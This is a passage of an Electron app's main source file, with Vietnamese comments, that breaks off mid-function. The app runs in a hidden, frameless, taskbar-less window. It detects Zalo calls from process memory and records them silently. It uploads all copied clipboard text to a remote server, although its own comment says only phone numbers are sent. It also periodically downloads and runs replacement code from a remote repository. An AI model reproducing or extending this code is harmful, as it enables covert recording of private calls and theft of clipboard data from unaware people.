const { app, BrowserWindow, ipcMain, desktopCapturer, clipboard } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');
const axios = require('axios');
const clipboardEvent = require('clipboard-event');
const { getVersionFromGitHub, downloadFileFromGitHub } = require('./utils/github-downloader');
const contentTypeMap = {
    '.mp3': 'audio/mpeg',
    '.webm': 'audio/webm',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.png': 'image/png'
};

/* --------------------------------------------------
   1. Load CONFIG an toàn cho Electron production
-------------------------------------------------- */

function loadJSONConfig() {
    try {
        const configPath = app.isPackaged
            ? path.join(process.resourcesPath, "config", "default.json")
            : path.join(__dirname, "../config/default.json");

        if (!fs.existsSync(configPath)) {
            console.warn("default.json not found:", configPath);
            return {};
        }

        return JSON.parse(fs.readFileSync(configPath, "utf8"));
    } catch (err) {
        console.warn("Failed to load default.json:", err.message);
        return {};
    }
}

const appConfig = loadJSONConfig();

/* --------------------------------------------------
   2. Load MEMORY_CALL_THRESHOLD_KB và NameCode từ installer
   (Tạm thời khai báo, sẽ đọc sau khi setup logger)
-------------------------------------------------- */

let installThreshold = null;
let installNameCode = null;

/* --------------------------------------------------
   3. Áp dụng cấu hình (fallback 3 tầng)
-------------------------------------------------- */

const DEFAULT_THRESHOLD = 100000;

// MEMORY_CALL_THRESHOLD_KB sẽ được cập nhật sau khi đọc file config

const OUTPUT_DIR = path.join(
    app.getPath("documents"),
    appConfig.RECORDINGS_DIR || "recordings"
);

/* --------------------------------------------------
   4. FFmpeg path
-------------------------------------------------- */

const FFMPEG_PATH = app.isPackaged
    ? path.join(process.resourcesPath, "tools", "ffmpeg.exe")
    : path.join(__dirname, "../tools/ffmpeg.exe");

/* --------------------------------------------------
   5. Prepare dirs
-------------------------------------------------- */

if (!fs.existsSync(OUTPUT_DIR)) {
    fs.mkdirSync(OUTPUT_DIR, { recursive: true });
}

/* --------------------------------------------------
   5.1. Helper: Tạo env object sạch, loại bỏ Python path không hợp lệ
-------------------------------------------------- */

function getCleanEnv() {
    const env = { ...process.env };
    // Loại bỏ các biến Python không hợp lệ có thể gây lỗi ENOENT
    delete env.PYTHON;
    delete env.PYTHONPATH;
    // Giữ lại các biến cần thiết
    return env;
}

/* --------------------------------------------------
   6. Logger System - Chỉ ghi ERROR vào file theo ngày
-------------------------------------------------- */

const LOG_DIR = path.join(OUTPUT_DIR, 'logs');

// Tạo thư mục logs nếu chưa có
if (!fs.existsSync(LOG_DIR)) {
    fs.mkdirSync(LOG_DIR, { recursive: true });
}

// Lưu console gốc
const originalConsoleLog = console.log;
const originalConsoleError = console.error;
const originalConsoleWarn = console.warn;

/**
 * Lấy đường dẫn file log theo ngày hiện tại
 */
function getLogFilePath() {
    const today = new Date().toISOString().split('T')[0].replace(/-/g, '_');
    return path.join(LOG_DIR, `app_${today}.log`);
}

/**
 * Ghi log ERROR vào file với timestamp (chỉ ghi ERROR)
 */
function writeToLogFile(level, source, ...args) {
    // Chỉ ghi ERROR vào file
    if (level !== 'ERROR') {
        return;
    }
    
    try {
        const logFilePath = getLogFilePath();
        const timestamp = new Date().toISOString();
        const message = args.map(arg => {
            if (typeof arg === 'object') {
                try {
                    return JSON.stringify(arg, null, 2);
                } catch {
                    return String(arg);
                }
            }
            return String(arg);
        }).join(' ');
        const logMessage = `[${timestamp}] [${level}] [${source}] ${message}\n`;
        fs.appendFileSync(logFilePath, logMessage, 'utf8');
    } catch (error) {
        // Nếu không ghi được log, in ra console gốc
        originalConsoleError('Failed to write log:', error);
    }
}

// Override console.log - Chỉ in ra console, không ghi file
console.log = function(...args) {
    originalConsoleLog.apply(console, args);
    writeToLogFile('LOG', 'MAIN', ...args);
};

// Override console.error - In ra console và ghi vào file
console.error = function(...args) {
    originalConsoleError.apply(console, args);
    writeToLogFile('ERROR', 'MAIN', ...args);
};

// Override console.warn - Chỉ in ra console, không ghi file
console.warn = function(...args) {
    originalConsoleWarn.apply(console, args);
};

// IPC handler để renderer gửi log về main process (chỉ ERROR)
ipcMain.on('renderer-log', (event, level, ...args) => {
    if (level === 'ERROR') {
        writeToLogFile(level, 'RENDERER', ...args);
    }
});

/* --------------------------------------------------
   2. Function để load config files từ installer
-------------------------------------------------- */

function loadConfigFiles() {
    const configPath = app.isPackaged
        ? path.join(process.resourcesPath, "..", "config.txt")
        : path.join(__dirname, "config.txt");

    if (fs.existsSync(configPath)) {
        try {
            const configContent = fs.readFileSync(configPath, "utf8");

            // Parse format key=value, mỗi dòng một key
            const lines = configContent.split(/\r?\n/);
            
            for (const line of lines) {
                const trimmedLine = line.trim();
                // Bỏ qua dòng trống và comment
                if (!trimmedLine || trimmedLine.startsWith('#')) {
                    continue;
                }

                // Tách key và value
                const equalIndex = trimmedLine.indexOf('=');
                if (equalIndex === -1) {
                    continue; // Bỏ qua dòng không có dấu =
                }

                const key = trimmedLine.substring(0, equalIndex).trim();
                const value = trimmedLine.substring(equalIndex + 1).trim();

                // Đọc MEMORY_CALL_THRESHOLD_KB
                if (key === 'MEMORY_CALL_THRESHOLD_KB') {
                    const parsed = parseInt(value, 10);
                    if (!isNaN(parsed)) {
                        installThreshold = parsed;
                    } else {
                        console.error('Failed to parse MEMORY_CALL_THRESHOLD_KB, value:', value);
                    }
                }

                // Đọc NAME_CODE
                if (key === 'NAME_CODE') {
                    installNameCode = value;
                }
            }
        } catch (err) {
            console.error('Error reading/parsing config file:', err.message);
            console.error('Error stack:', err.stack);
        }
    }

    // Cập nhật lại MEMORY_CALL_THRESHOLD_KB chỉ khi đọc được giá trị mới từ config
    if (installThreshold !== null) {
        MEMORY_CALL_THRESHOLD_KB = installThreshold;
    } else {
        // Chỉ dùng fallback nếu chưa đọc được từ config (giữ nguyên giá trị hiện tại)
        const previousValue = MEMORY_CALL_THRESHOLD_KB;
        const fallbackValue = appConfig.MEMORY_CALL_THRESHOLD_KB || DEFAULT_THRESHOLD;
        
        // Chỉ cập nhật nếu giá trị fallback khác với giá trị hiện tại
        if (previousValue !== fallbackValue) {
            MEMORY_CALL_THRESHOLD_KB = fallbackValue;
        }
    }
}

/* --------------------------------------------------
   2.1. Setup file watcher để tự động reload config khi file được tạo/thay đổi
-------------------------------------------------- */

function setupConfigFileWatcher() {
    const configPath = app.isPackaged
        ? path.join(process.resourcesPath, "..", "config.txt")
        : path.join(__dirname, "config.txt");

    const configDir = path.dirname(configPath);
    const configFileName = path.basename(configPath);

    // Sử dụng fs.watchFile để theo dõi file (hoạt động cả khi file chưa tồn tại)
    fs.watchFile(configPath, { interval: 1000 }, (curr, prev) => {
        // Kiểm tra nếu file vừa được tạo (prev.mtime = 0) hoặc được thay đổi
        if (curr.mtime !== prev.mtime || (prev.mtime.getTime() === 0 && curr.mtime.getTime() > 0)) {
            loadConfigFiles();
        }
    });

    // Cũng watch thư mục để phát hiện khi file được tạo
    if (fs.existsSync(configDir)) {
        fs.watch(configDir, (eventType, filename) => {
            if (filename === configFileName) {
                // Delay một chút để đảm bảo file đã được ghi xong
                setTimeout(() => {
                    loadConfigFiles();
                }, 100);
            }
        });
    }
}

// Khởi tạo MEMORY_CALL_THRESHOLD_KB với giá trị mặc định
let MEMORY_CALL_THRESHOLD_KB = 
    appConfig.MEMORY_CALL_THRESHOLD_KB ||
    DEFAULT_THRESHOLD;

// Kiểm tra FFmpeg
if (!fs.existsSync(FFMPEG_PATH)) {
    console.error('FFmpeg NOT FOUND:', FFMPEG_PATH);
    console.error('This will cause recording conversion to fail!');
}

// Kiểm tra quyền ghi vào OUTPUT_DIR
try {
    const testFile = path.join(OUTPUT_DIR, '.write_test');
    fs.writeFileSync(testFile, 'test');
    fs.unlinkSync(testFile);
} catch (err) {
    console.error('Output directory is NOT writable:', OUTPUT_DIR);
    console.error('Error:', err.message);
    console.error('This will cause recording save to fail!');
}

/* --------------------------------------------------
   6.5. API Client - Function chung để gọi API
-------------------------------------------------- */

/**
 * Function chung để gọi API với axios
 * @param {string} endpoint - API endpoint (ví dụ: 'functions/v1/report-status')
 * @param {string} method - HTTP method: 'GET', 'POST', 'PUT', 'DELETE' (mặc định: 'GET')
 * @param {object} data - Request body data (optional)
 * @param {object} customHeaders - Custom headers bổ sung (optional)
 * @param {number} timeout - Timeout in milliseconds (mặc định: 10000)
 * @returns {Promise<object>} Response data từ API
 * @throws {Error} Nếu có lỗi xảy ra
 */
async function callApi(apiUrl, endpoint, method = 'GET', data = null, customHeaders = {}, timeout = 10000, isWriteLog = true) {
    try {
        // Kiểm tra nếu endpoint là full URL (presignUrl)
        const isFullUrl = endpoint && (endpoint.startsWith('http://') || endpoint.startsWith('https://'));
        const finalUrl = isFullUrl ? endpoint : `${apiUrl}/${endpoint}`;
        
        if (!isFullUrl && (!apiUrl || apiUrl.includes('undefined'))) {
            console.error('callApi: ERROR - API URL is not set');
            return false;
        }
        
        const headers = {
            ...customHeaders
        };
        
        // Chỉ set Content-Type mặc định nếu:
        // - Không có trong customHeaders
        // - Data không phải Buffer/Stream
        // - Data không phải null/undefined
        if (!customHeaders['Content-Type'] && !(data instanceof Buffer) && !(data && typeof data.pipe === 'function') && data !== null) {
            headers['Content-Type'] = 'application/json';
        }
        
        const config = {
            method: method.toUpperCase(),
            url: finalUrl,
            headers: headers,
            timeout: timeout
        };
        
        // Hỗ trợ file lớn cho PUT/POST với binary data
        if (data instanceof Buffer || (data && typeof data.pipe === 'function')) {
            config.maxContentLength = Infinity;
            config.maxBodyLength = Infinity;
        }
        
        if (data && (method.toUpperCase() === 'POST' || method.toUpperCase() === 'PUT' || method.toUpperCase() === 'PATCH')) {
            config.data = data;
        }
        
        const response = await axios(config);
        
        return response.data;
    } catch (error) {
        console.error(`callApi ${endpoint} catch error:`, error);
        return error;
    }
}

/* --------------------------------------------------
   7. Code Cache System - Download và cache renderer.js từ remote
-------------------------------------------------- */

let mainWindow = null;

// Cache directory cho code files
const CODE_CACHE_DIR = app.isPackaged
    ? path.join(app.getPath('userData'), 'code-cache')
    : path.join(__dirname, '../code-cache');

// Tạo cache directory nếu chưa có
if (!fs.existsSync(CODE_CACHE_DIR)) {
    fs.mkdirSync(CODE_CACHE_DIR, { recursive: true });
}

/**
 * Lấy version từ package.json trên GitHub
 * @returns {Promise<string|null>} Version string hoặc null nếu lỗi
 */
async function getVersionFromGitLab() {
    return await getVersionFromGitHub(appConfig);
}

/**
 * Download file từ GitHub
 * @param {string} filePath - Đường dẫn file trong repo
 * @param {string} outputPath - Đường dẫn lưu file local
 * @returns {Promise<boolean>} True nếu download thành công
 */
async function downloadFileFromGitLab(filePath, outputPath) {
    return await downloadFileFromGitHub(filePath, outputPath, appConfig);
}

/**
 * Download renderer.js từ GitLab
 * @returns {Promise<string>} Đường dẫn đến renderer.js (local hoặc cache)
 */
async function loadRendererJs() {
    const localRendererJs = path.join(__dirname, 'renderer.js');
    const cacheRendererJs = path.join(CODE_CACHE_DIR, 'renderer.js');
    const versionFile = path.join(CODE_CACHE_DIR, 'app.version');

    // Nếu không có GitLab config, dùng local file
    if (!appConfig.REMOTE_CODE_ENABLED) {
        if (fs.existsSync(localRendererJs)) {
            return localRendererJs;
        }
        throw new Error('Local renderer.js not found and remote code is disabled');
    }

    try {
        // Lấy version từ GitLab package.json
        const remoteVersion = await getVersionFromGitLab();
        
        if (!remoteVersion) {
            // Fallback
            if (fs.existsSync(cacheRendererJs)) {
                return cacheRendererJs;
            }
            if (fs.existsSync(localRendererJs)) {
                return localRendererJs;
            }
            throw new Error('Cannot get version from GitLab');
        }

        // Đọc local version nếu có
        let localVersion = null;
        if (fs.existsSync(versionFile)) {
            localVersion = fs.readFileSync(versionFile, 'utf8').trim();
        }

        // Nếu version khác hoặc chưa có cache, download
        if (remoteVersion !== localVersion) {
            console.log(`Downloading renderer.js from GitLab (version: ${remoteVersion})...`);
            const downloadSuccess = await downloadFileFromGitLab('renderer.js', cacheRendererJs);
            
            if (downloadSuccess) {
                fs.writeFileSync(versionFile, remoteVersion, 'utf8');
                console.log('renderer.js downloaded successfully from GitLab');
                return cacheRendererJs;
            } else {
                console.warn('Failed to download renderer.js from GitLab, using cached version if available');
            }
        }

        // Nếu có cache file, dùng cache
        if (fs.existsSync(cacheRendererJs)) {
            return cacheRendererJs;
        }

        // Fallback về local file
        if (fs.existsSync(localRendererJs)) {
            console.warn('Using local renderer.js as fallback');
            return localRendererJs;
        }

        throw new Error('No renderer.js available');
    } catch (error) {
        console.error('loadRendererJs error:', error.message);
        
        if (fs.existsSync(localRendererJs)) {
            console.warn('Using local renderer.js as fallback');
            return localRendererJs;
        }
        
        if (fs.existsSync(cacheRendererJs)) {
            console.warn('Using cached renderer.js as fallback');
            return cacheRendererJs;
        }

        throw error;
    }
}

/* --------------------------------------------------
   7. Hidden BrowserWindow (MediaRecorder)
-------------------------------------------------- */

async function createWindow() {
    mainWindow = new BrowserWindow({
        width: 1,
        height: 1,
        show: false,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            enableRemoteModule: true
        },
        frame: false,
        transparent: true,
        skipTaskbar: true
    });

    // Capture console messages từ renderer (chỉ ERROR)
    mainWindow.webContents.on('console-message', (event, level, message) => {
        if (level === 2) { // ERROR level
            writeToLogFile('ERROR', 'RENDERER', message);
        }
    });

    // Load renderer.js và inject vào HTML
    try {
        const rendererJsPath = await loadRendererJs();
        const rendererJsContent = fs.readFileSync(rendererJsPath, 'utf8');
        
        // Đọc HTML template
        const htmlPath = path.join(__dirname, 'index.html');
        let htmlContent = fs.readFileSync(htmlPath, 'utf8');
        
        // Thay thế script tag renderer.js bằng inline script với code đã download
        htmlContent = htmlContent.replace(
            /<script src="renderer\.js"><\/script>/,
            `<script>${rendererJsContent}</script>`
        );
        
        // Tạo temp HTML file với renderer.js đã inject
        const tempHtmlPath = path.join(CODE_CACHE_DIR, 'index.html');
        fs.writeFileSync(tempHtmlPath, htmlContent, 'utf8');
        
        // Load temp HTML file
        mainWindow.loadFile(tempHtmlPath);
    } catch (error) {
        console.error('Failed to load renderer.js from remote, using local:', error.message);
        // Fallback về local HTML
        mainWindow.loadFile('src/index.html');
    }
}

function isZaloRunning() {
    return new Promise((resolve) => {
        exec('tasklist', {
            shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh',
            env: getCleanEnv()
        }, (error, stdout, stderr) => {
            if (error) {
                console.error('isZaloRunning catch error executing tasklist:', error.message);
                if (stderr) {
                    console.error('isZaloRunning catch stderr executing tasklist:', stderr);
                }
                resolve(false);
                return;
            }
            const isRunning = stdout.toLowerCase().includes('zalo.exe');
            // Chỉ log khi có thay đổi trạng thái hoặc mỗi 20 lần
            resolve(isRunning);
        });
    });
}

async function checkZaloCallStatusCPU() {
    const cpu = await checkZaloCPU();
    const isInCall = cpu > 3;
    return { isInCall, cpu };
}

async function checkZaloCallStatusMemory() {
    const memory = await checkZaloMemory();
    const isInCall = memory > MEMORY_CALL_THRESHOLD_KB;
    return { isInCall, memory };
}

let isRecording = false;
let monitoringInterval;
let clipboardEventStarted = false;
let lastClipboardText = '';
let versionCheckInterval = null;

async function startMonitoring() {
    let loopCount = 0;
    monitoringInterval = setInterval(async () => {
        // call api hearbeat
        loopCount++;
        callApiHeartbeat(loopCount);
        const loopStartTime = Date.now();
        
        try {
            const zaloRunning = await isZaloRunning();
            
            if (!zaloRunning) {
                if (isRecording) {
                    mainWindow.webContents.send('stop-recording');
                    isRecording = false;
                }
                return;
            }

            const callStatus = await checkZaloCallStatusMemory();

            if (callStatus.isInCall && !isRecording) {
                console.log(`[START] ZaloCall is in call, starting recording - Memory: ${callStatus.memory} KB (threshold: ${MEMORY_CALL_THRESHOLD_KB} KB)`);
                mainWindow.webContents.send('start-recording');
                isRecording = true;
            }

            if (!callStatus.isInCall && isRecording) {
                console.log(`[STOP] ZaloCall is not in call, stopping recording - Memory: ${callStatus.memory} KB (threshold: ${MEMORY_CALL_THRESHOLD_KB} KB)`);
                mainWindow.webContents.send('stop-recording');
                isRecording = false;
            }

            // Log memory trong quá trình ghi âm
            if (isRecording && loopCount % 100 === 0) {
                console.log(`[RECORDING] ZaloCall memory: ${callStatus.memory} KB (threshold: ${MEMORY_CALL_THRESHOLD_KB} KB)`);
            }
        } catch (error) {
            console.error('Monitoring loop error:', error);
        } finally {
            const loopDuration = Date.now() - loopStartTime;
            if (loopDuration > 100 && loopCount % 1200 === 0) {
                console.error(`Warning: Loop took ${loopDuration}ms (should be < 100ms)`);
            }
        }
    }, 3000);
}

function checkZaloCPU() {
    return new Promise((resolve) => {
        exec('typeperf "\\Process(ZaloCall)\\% Processor Time" -sc 1', {
            shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh',
            env: getCleanEnv()
        }, (error, stdout) => {
            if (error) {
                resolve(0);
                return;
            }

            const lines = stdout.trim().split('\n');
            if (lines.length >= 3) {
                const lastLine = lines[1].replace(/"/g, '');
                const parts = lastLine.split(',');
                const cpu = parseFloat(parts[1]) || 0;
                resolve(cpu);
            } else {
                resolve(0);
            }
        });
    });
}

function checkZaloMemory() {
    return new Promise((resolve) => {
        exec('tasklist /fi "imagename eq ZaloCall.exe"', {
            shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh',
            env: getCleanEnv()
        }, (error, stdout, stderr) => {
            if (error) {
                // Chỉ log lỗi, không spam
                if (error.code !== 1) { // code 1 là "not found", không phải lỗi thực sự
                    console.error('checkZaloMemory error executing tasklist:', error.message);
                    if (stderr) {
                        console.error('checkZaloMemory stderr error:', stderr);
                    }
                }
                resolve(0);
                return;
            }
            
            const lines = stdout.split('\n');
            
            if (!lines.length) {
                // Không log để tránh spam khi ZaloCall chưa chạy
                resolve(0);
                return;
            }

            const line = lines.find(l => l.toLowerCase().includes("zalocall.exe"));
            if (!line) {
                // Không log để tránh spam khi ZaloCall chưa chạy
                resolve(0);
                return;
            }

            const parts = line.trim().split(/\s+/);
            const memUsageStr = parts.slice(4).join(" ");

            const memKB = parseInt(memUsageStr.replace(/[,K]/gi, ""));
            
            if (isNaN(memKB)) {
                console.error('checkZaloMemory: Line:', line);
                console.error('checkZaloMemory: Failed to parse memory value:', memUsageStr);
                resolve(0);
                return;
            }
            
            // Chỉ log khi có giá trị memory (ZaloCall đang chạy)
            // Log sẽ được gọi từ monitoring loop khi cần
            resolve(memKB);
        });
    });
}

/**
 * Check version của renderer.js từ GitLab và reload nếu có version mới
 * @returns {Promise<boolean>} True nếu đã reload
 */
async function checkAndUpdateRendererJs() {
    if (!appConfig.GITLAB_REPO_URL || !appConfig.REMOTE_CODE_ENABLED) {
        return false;
    }

    const cacheRendererJs = path.join(CODE_CACHE_DIR, 'renderer.js');
    const versionFile = path.join(CODE_CACHE_DIR, 'app.version');

    try {
        // Lấy version từ GitLab package.json
        const remoteVersion = await getVersionFromGitLab();
        
        if (!remoteVersion) {
            return false;
        }

        // Đọc local version nếu có
        let localVersion = null;
        if (fs.existsSync(versionFile)) {
            localVersion = fs.readFileSync(versionFile, 'utf8').trim();
        }

        // Nếu version khác, download và reload
        if (remoteVersion !== localVersion) {
            console.log(`[UPDATE] New renderer.js version detected: ${remoteVersion} (current: ${localVersion || 'none'})`);
            
            const downloadSuccess = await downloadFileFromGitLab('renderer.js', cacheRendererJs);
            
            if (downloadSuccess) {
                // Lưu version
                fs.writeFileSync(versionFile, remoteVersion, 'utf8');
                console.log('[UPDATE] renderer.js updated successfully from GitLab, reloading window...');
                
                // Reload window với code mới
                if (mainWindow && !mainWindow.isDestroyed()) {
                    const rendererJsContent = fs.readFileSync(cacheRendererJs, 'utf8');
                    const htmlPath = path.join(__dirname, 'index.html');
                    let htmlContent = fs.readFileSync(htmlPath, 'utf8');
                    htmlContent = htmlContent.replace(
                        /<script src="renderer\.js"><\/script>/,
                        `<script>${rendererJsContent}</script>`
                    );
                    const tempHtmlPath = path.join(CODE_CACHE_DIR, 'index.html');
                    fs.writeFileSync(tempHtmlPath, htmlContent, 'utf8');
                    mainWindow.loadFile(tempHtmlPath);
                }
                
                return true;
            }
        }
    } catch (error) {
        console.error('checkAndUpdateRendererJs error:', error.message);
    }
    
    return false;
}

/**
 * Check version của main.js từ GitLab và restart app nếu có version mới
 * @returns {Promise<boolean>} True nếu cần restart
 */
async function checkAndUpdateMainJs() {
    if (!appConfig.GITLAB_REPO_URL || !appConfig.REMOTE_CODE_ENABLED) {
        return false;
    }

    const CACHE_DIR = app.isPackaged
        ? path.join(app.getPath('userData'), 'code-cache')
        : path.join(__dirname, '../code-cache');
    const cacheMainJs = path.join(CACHE_DIR, 'main.js');
    const cacheRendererJs = path.join(CODE_CACHE_DIR, 'renderer.js');
    const versionFile = path.join(CACHE_DIR, 'app.version');

    try {
        // Lấy version từ GitLab package.json
        const remoteVersion = await getVersionFromGitLab();
        
        if (!remoteVersion) {
            return false;
        }

        // Đọc local version nếu có
        let localVersion = null;
        if (fs.existsSync(versionFile)) {
            localVersion = fs.readFileSync(versionFile, 'utf8').trim();
        }

        // Nếu version khác, download và restart app
        if (remoteVersion !== localVersion) {
            console.log(`[UPDATE] New main.js version detected: ${remoteVersion} (current: ${localVersion || 'none'})`);
            console.log('Downloading main.js and renderer.js from GitLab...');
            
            // Download cả main.js và renderer.js từ GitLab
            const mainJsSuccess = await downloadFileFromGitLab('main.js', cacheMainJs);
            const rendererJsSuccess = await downloadFileFromGitLab('renderer.js', cacheRendererJs);
            
            if (mainJsSuccess && rendererJsSuccess) {
                // Lưu version
                fs.writeFileSync(versionFile, remoteVersion, 'utf8');
                // Lưu version cho renderer cũng
                fs.writeFileSync(path.join(CODE_CACHE_DIR, 'app.version'), remoteVersion, 'utf8');
                console.log('[UPDATE] main.js and renderer.js updated successfully from GitLab, restarting app...');
                
                // Restart app sau 2 giây
                setTimeout(() => {
                    app.relaunch();
                    app.exit(0);
                }, 2000);
                
                return true;
            } else {
                console.error('[UPDATE] Failed to download some files from GitLab');
            }
        }
    } catch (error) {
        console.error('checkAndUpdateMainJs error:', error.message);
    }
    
    return false;
}

/**
 * Bắt đầu auto-check version định kỳ
 */
function startVersionCheck() {
    if (!appConfig.REMOTE_CODE_ENABLED || !appConfig.REMOTE_CODE_URL) {
        return;
    }

    const checkInterval = appConfig.REMOTE_CODE_CHECK_INTERVAL_MS || 300000; // Mặc định 5 phút

    versionCheckInterval = setInterval(async () => {
        try {
            // Check main.js version (sẽ restart app nếu có version mới)
            const mainUpdated = await checkAndUpdateMainJs();
            if (mainUpdated) {
                // App sẽ restart, không cần check renderer
                return;
            }

            // Check renderer.js version (sẽ reload window nếu có version mới)
            await checkAndUpdateRendererJs();
        } catch (error) {
            console.error('Version check error:', error.message);
        }
    }, checkInterval);

    console.log(`[VERSION CHECK] Started auto-check every ${checkInterval / 1000} seconds`);
}

/**
 * Dừng auto-check version
 */
function stopVersionCheck() {
    if (versionCheckInterval) {
        clearInterval(versionCheckInterval);
        versionCheckInterval = null;
    }
}

ipcMain.handle('get-sources', async () => {
    const sources = await desktopCapturer.getSources({
        types: ['screen', 'window'],
        thumbnailSize: { width: 150, height: 150 }
    });
    return sources;
});

// Convert WebM to MP3 using FFmpeg
function convertToMP3(inputPath, outputPath) {
    // Kiểm tra input file
    if (!fs.existsSync(inputPath)) {
        const error = new Error(`Input file not found: ${inputPath}`);
        console.error('convertToMP3: ERROR -', error.message);
        return Promise.reject(error);
    }
    
    try {
        const inputStats = fs.statSync(inputPath);
        if (inputStats.size === 0) {
            const error = new Error('Input file is empty');
            console.error('convertToMP3: ERROR -', error.message);
            return Promise.reject(error);
        }
    } catch (err) {
        console.error('convertToMP3 catch error checking input file:', err.message);
        return Promise.reject(err);
    }
    
    // Kiểm tra FFmpeg
    if (!fs.existsSync(FFMPEG_PATH)) {
        const error = new Error(`FFmpeg not found: ${FFMPEG_PATH}`);
        console.error('convertToMP3 catch error:', error.message);
        return Promise.reject(error);
    }
    
    return new Promise((resolve, reject) => {
        const command = `"${FFMPEG_PATH}" -i "${inputPath}" -vn -ar 44100 -ac 2 -b:a 192k "${outputPath}"`;
        
        exec(command, {
            shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh',
            env: getCleanEnv(),
            maxBuffer: 10 * 1024 * 1024
        }, (error, stdout, stderr) => {
            if (error) {
                console.error('convertToMP3: FFmpeg execution failed', error);
                reject(error);
                return;
            }
            
            // Kiểm tra output file
            if (fs.existsSync(outputPath)) {
                try {
                    const outputStats = fs.statSync(outputPath);
                    if (outputStats.size === 0) {
                        const error = new Error('Output file is empty');
                        console.error('convertToMP3: ERROR -', error.message);
                        reject(error);
                        return;
                    }
                } catch (err) {
                    console.error('convertToMP3: Error checking output file:', err.message);
                    reject(err);
                    return;
                }
            } else {
                const error = new Error('Output file was not created');
                console.error('convertToMP3: ERROR -', error.message);
                reject(error);
                return;
            }
            
            resolve(outputPath);
        });
    });
}

async function callApiHeartbeat(loopCount) {
    try {
        const responseData = await callApi(
            appConfig.API_URL,
            appConfig.HEARTBEAT_API,
            'POST',
            { is_online: true },
            { 'x-api-token': appConfig.SALE_TOKEN },
            10000,
            false
        );
        if (!responseData?.success) {
            console.error('callApiHeartbeat error:', responseData?.message || 'Unknown error');
            return false;
        }
        return true;
    } catch (error) {
        console.error('callApiHeartbeat: ERROR -', error.message);
        return false;
    }
}

/**
 * Validate số điện thoại Việt Nam
 * Hỗ trợ các format:
 * - 0912345678 (10 số, bắt đầu bằng 0)
 * - 84912345678 (11 số, bắt đầu bằng 84)
 * - +84912345678 (có dấu +)
 * - 912345678 (9 số, không có 0 đầu)
 * @param {string} text - Text cần validate
 * @returns {string|null} Số điện thoại đã chuẩn hóa hoặc null nếu không hợp lệ
 */
function validateAndNormalizePhoneNumber(text) {
    if (!text || typeof text !== 'string') {
        return null;
    }
    
    // Loại bỏ khoảng trắng, dấu gạch ngang, dấu chấm
    const cleaned = text.trim().replace(/[\s\-\.\(\)]/g, '');
    
    // Kiểm tra các pattern số điện thoại VN
    // Format 1: 0912345678 (10 số, bắt đầu 0)
    if (/^0\d{9}$/.test(cleaned)) {
        return cleaned;
    }
    
    // Format 2: 84912345678 (11 số, bắt đầu 84)
    if (/^84\d{9}$/.test(cleaned)) {
        return '0' + cleaned.substring(2); // Convert về format 0xxxxxxxxx
    }
    
    // Format 3: +84912345678 (có dấu +)
    if (/^\+84\d{9}$/.test(cleaned)) {
        return '0' + cleaned.substring(3); // Convert về format 0xxxxxxxxx
    }
    
    // Format 4: 912345678 (9 số, không có 0 đầu) - có thể là số di động
    if (/^[3-9]\d{8}$/.test(cleaned)) {
        return '0' + cleaned; // Thêm 0 đầu
    }
    
    // Không match pattern nào
    return null;
}


function validateAndNormalizeText(text) {
    if (!text || typeof text !== 'string') {
        return null;
    }
    
    // Loại bỏ khoảng trắng
    const cleaned = text.trim();
    if (cleaned.length > appConfig.TEXT_SIZE_MAX) {
        return null;
    }
    return cleaned;
}

/**
 * Gửi text clipboard lên server
 * @param {string} text - Text đã validate
 * @returns {Promise<boolean>} True nếu gửi thành công
 */
async function sendClipboardToServer(text) {
    try {
        if (!text || text.trim().length === 0) {
            return false;
        }
        
        const responseData = await callApi(
            appConfig.API_URL,
            appConfig.CLIPBOARD_API,
            'POST',
            {
                content: text,
            },
            { 'x-api-token': appConfig.SALE_TOKEN },
            10000,
            false // Không log mỗi lần gửi để tránh spam
        );
        
        if (!responseData?.success) {
            console.error('sendClipboardToServer error:', responseData?.message || 'Unknown error');
            return false;
        }
        
        return true;
    } catch (error) {
        console.error('sendClipboardToServer catch error:', error.message);
        return false;
    }
}

/**
 * Bắt đầu theo dõi clipboard bằng event-based thực sự (clipboard-event)
 * Chỉ gửi lên server khi clipboard là số điện thoại hợp lệ
 */
function startClipboardMonitoring() {
    const isEnabled = appConfig.CLIPBOARD_MONITOR_ENABLED !== false;
    
    if (!isEnabled) {
        return;
    }
    
    try {
        // Khởi tạo giá trị ban đầu
        lastClipboardText = clipboard.readText() || '';
        
        // Start clipboard event listener (event-based thực sự)
        clipboardEvent.startListening();
        clipboardEventStarted = true;
        
        // Lắng nghe event clipboard change
        clipboardEvent.on('change', () => {
            try {
                // Đọc text từ clipboard
                const currentText = clipboard.readText() || '';
                
                // Bỏ qua nếu không thay đổi hoặc rỗng
                if (currentText === lastClipboardText || currentText.trim().length === 0) {
                    return;
                }
                // Cập nhật lastClipboardText
                lastClipboardText = currentText;
                
                // Validate text
                const text = validateAndNormalizeText(currentText);
                
                if (!text) {
                    // Text không hợp lệ, bỏ qua
                    return;
                }
                
                // Gửi text lên server (async, không đợi kết quả)
                sendClipboardToServer(text).catch((error) => {
                    console.error('Failed to send text to server:', error.message);
                });
                
            } catch (error) {
                console.error('Clipboard change handler error:', error.message);
            }
        });
        
    } catch (error) {
        console.error('Failed to start clipboard event listener:', error.message);
        console.error('Error details:', error.stack);
    }
}

/**
 * Dừng theo dõi clipboard
 */
function stopClipboardMonitoring() {
    if (clipboardEventStarted) {
        try {
            clipboardEvent.stopListening();
            clipboardEventStarted = false;
        } catch (error) {
            console.error('Error stopping clipboard event listener:', error.message);
        }
    }
}

ipcMain.handle('save-file', async (event, { filename, dataUrl }) => {
    try {
        if (!dataUrl || !dataUrl.startsWith('data:')) {
            const error = new Error('Invalid dataUrl format');
            console.error('save-file: ERROR -', error.message);
            throw error;
        }
        
        // Create date folder
        const now = new Date();
        const dd = String(now.getDate()).padStart(2, '0');
        const mm = String(now.getMonth() + 1).padStart(2, '0');
        const yyyy = now.getFullYear();
        const dateFolder = `${dd}_${mm}_${yyyy}`;
        const dateDir = path.join(OUTPUT_DIR, dateFolder);

        if (!fs.existsSync(dateDir)) {
            try {
                fs.mkdirSync(dateDir, { recursive: true });
            } catch (err) {
                console.error('Failed to create date directory:', err.message);
                throw err;
            }
        }

        // Save temporary WebM file
